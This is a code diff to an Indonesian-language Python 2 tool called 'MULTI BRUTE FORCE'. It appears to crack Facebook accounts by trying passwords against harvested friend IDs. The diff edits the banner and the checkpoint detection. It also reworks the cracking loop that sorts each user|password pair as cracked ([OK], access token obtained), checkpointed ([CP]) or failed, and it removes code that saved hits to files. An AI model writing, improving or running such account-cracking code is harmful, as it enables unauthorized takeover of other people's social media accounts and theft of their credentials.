@@ -51,11 +51,12 @@ def banner():
           \rh [']  /'|'\             \\
           \rk     /  \  \             '
                \_  \_ \_ 
-     \rw      Thanks to \raIvana Raa
-     \rw      Created by \raIqbal Dev
+    
      \rw+==============================+
      \ra|       MULTI BRUTE FORCE      |
-     \rw+==============================+''')
+     \rw+==============================+
+           \rwThanks to \raIvana Raa/
+           \rwCreated by \raIqbal Dev''')
 
     
 
@@ -74,7 +75,7 @@ def login():
         run (h+" Login Sukses...")
         print
         #id_teman()
-    elif "error_msg" in dev:
+    elif "www.facebook.com" in dev["error_msg"]:
         print 
         print k+" Akun Kena Cekpoint.." 
         print
@@ -108,7 +109,8 @@ def id_teman():
             print
             print a+"\n  ID Tersimpan " + p + "(" + pu + "id.txt" + p + ")" 
             print 
-            raw_input(h+"[ "+p+"Lanjutkan Bos.."+h+" ]\n")
+            print (h+" [ "+p+"Lanjutkan Bos.."+h+" ]\n")
+            raw_input(k+ " => ")
 
         except IOError:
             print m+" Terjadi kesalahan..."
@@ -162,22 +164,15 @@ def mbfcrack():
             if count == len(baris):
                 break
             if "access_token" in jsl:
-                sukses = open("Dadi.txt", 'w')
-                sukses.write(user + " | " + password + "\n")
-                sukses.close()
                 dados.append(h+" [OK] " + pu + user + " | " + a + password)
                 count += 1
-           
+            elif "error_msg" in jsl:
+                gagal.append(m+" [CP] " + d + user + " | " + m + password)
+                count += 1
             else:
-                if "www.facebook" in jsl["error_msg"]:
-                    cekpo = open("cekpoint.txt", "w")
-                    cekpo.write(user + " | " + password + "\n")
-                    cekpo.close()
-                    gagal.append(m+" [CP] " + d + user + " | " + m + password)
-                    count += 1
-                else:
-                    oradadi.append(user)
-                    count += 1
+                oradadi.append(user)
+                count += 1
+        
             sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " [ " + h + str(len(dados)) + pu + " / " + k + str(len(gagal)) + m + " ]")
             sys.stdout.flush()
         
